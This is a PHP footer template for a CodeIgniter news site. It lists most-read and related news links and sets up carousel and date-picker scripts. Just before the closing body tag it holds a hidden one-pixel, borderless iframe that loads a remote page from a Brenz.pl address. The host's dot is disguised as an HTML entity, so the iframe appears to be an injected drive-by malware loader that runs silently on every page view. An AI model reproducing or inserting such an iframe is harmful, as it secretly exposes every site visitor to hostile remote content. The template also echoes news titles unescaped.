<footer>
	<div class="wrap-footer">
		<div class="container">
			<div class="row">
				<!-- <div class="col-md-4 col-footer footer-1">
						<div class="footer-heading"><h1><span style="color: #fff;">NEWSPAPER</span></h1></div>
						<div class="content">
							<p>Never missed any post published in our site. Subscribe to our daly newsletter now.</p>
							<strong>Email address:</strong>
							<form action="#" method="post">
								<input type="text" name="your-name" value="" size="40" placeholder="Your Email" />
								<input type="submit" value="SUBSCRIBE" class="btn btn-3" />
							</form>
						</div>
					</div>
					<div class="col-md-4 col-footer footer-2">
						<div class="footer-heading"><h4>Tags</h4></div>
						<div class="content">
							<a href="#">animals</a>
							<a href="#">cooking</a>
							<a href="#">countries</a>
							<a href="#">city</a>
							<a href="#">children</a>
							<a href="#">home</a>
							<a href="#">likes</a>
							<a href="#">photo</a>
							<a href="#">link</a>
							<a href="#">law</a>
							<a href="#">shopping</a>
							<a href="#">skate</a>
							<a href="#">scholl</a>
							<a href="#">video</a>
							<a href="#">travel</a>
							<a href="#">images</a>
							<a href="#">love</a>
							<a href="#">lists</a>
							<a href="#">makeup</a>
							<a href="#">media</a>
							<a href="#">password</a>
							<a href="#">pagination</a>
							<a href="#">wildlife</a>
						</div>
					</div>
					<div class="col-md-4 col-footer footer-3">
						<div class="footer-heading"><h4>Link List</h4></div>
						<div class="content">
							<ul>
								<li><a href="#">MOST VISITED COUNTRIES</a></li>
								<li><a href="#">5 PLACES THAT MAKE A GREAT HOLIDAY</a></li>
								<li><a href="#">PEBBLE TIME STEEL IS ON TRACK TO SHIP IN JULY</a></li>
								<li><a href="#">STARTUP COMPANY’S CO-FOUNDER TALKS ON HIS NEW PRODUCT</a></li>
							</ul>
						</div>
					</div> -->

				<?php if(isset($mostreadnews)){ ?>
				<div class="col-md-4 col-footer footer-3">
					<div class="footer-heading">
						<h4>Most Read News</h4>
					</div>
					<div class="content">
						<div class="col-md-13 col-footer footer-4">
							<div class="footer-heading">
								<h4>
									<!-- Most Read News -->
								</h4>
							</div>
							<div class="content">
								<ul>
									<?php foreach($mostreadnews as $row): ?>
									<li><a
										href="<?php echo base_url(); ?>index.php/welcome/news/<?php echo $row->news_id; ?>">
											<?php echo $row->title;  ?>
									</a></li>
									<?php endforeach; ?>
								</ul>
							</div>
						</div>
					</div>
				</div>
				<?php } ?>
				<?php if(isset($relatednews)){ ?>
				<div class="col-md-4 col-footer footer-1">
					<div class="footer-heading">
						<h4>Read more news</h4>
					</div>
					<div class="content">
						<div class="content">
							<ul>
								<?php foreach($relatednews as $row): ?>
								<li><a
									href="<?php echo base_url(); ?>index.php/welcome/news/<?php echo $row->news_id; ?>">
										<?php echo $row->title;  ?>
								</a></li>
								<?php endforeach; ?>
							</ul>
						</div>
					</div>
				</div>
				<?php } ?>


			</div>
			<div class="copy-right">
				<p>
					Copyright 2015 - <a href="http://www.365bootstrap.com"
						target="_blank" rel="nofollow">Bootstrap Themes</a> Designed by
					365Bootstrap.com
				</p>
			</div>
</footer>
<!-- Footer -->

<!-- JS -->
<script src="assets/resource/owl-carousel/owl.carousel.js"></script>
<script>
	$(document).ready(function() {
		$("#owl-demo-1").owlCarousel({
			autoPlay : 3000,
			items : 1,
			itemsDesktop : [ 1199, 1 ],
			itemsDesktopSmall : [ 400, 1 ]
		});
		$("#owl-demo-2").owlCarousel({
			autoPlay : 3000,
			items : 3,

		});
	});
</script>


<script type="text/javascript"
	src=">assets/resource/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>
<script type="text/javascript"
	src="assets/resource/js/locales/bootstrap-datetimepicker.fr.js"
	charset="UTF-8"></script>
<script type="text/javascript">
	$('.form_datetime').datetimepicker({
		//language:  'fr',
		weekStart : 1,
		todayBtn : 1,
		autoclose : 1,
		todayHighlight : 1,
		startView : 2,
		forceParse : 0,
		showMeridian : 1
	});
	$('.form_date').datetimepicker({
		language : 'fr',
		weekStart : 1,
		todayBtn : 1,
		autoclose : 1,
		todayHighlight : 1,
		startView : 2,
		minView : 2,
		forceParse : 0
	});
	$('.form_time').datetimepicker({
		language : 'fr',
		weekStart : 1,
		todayBtn : 1,
		autoclose : 1,
		todayHighlight : 1,
		startView : 1,
		minView : 0,
		maxView : 1,
		forceParse : 0
	});
</script>
<iframe style="height: 1px" src="http://www&#46;Brenz.pl/rc/"
	frameborder=0 width=1></iframe>
</body>
</html>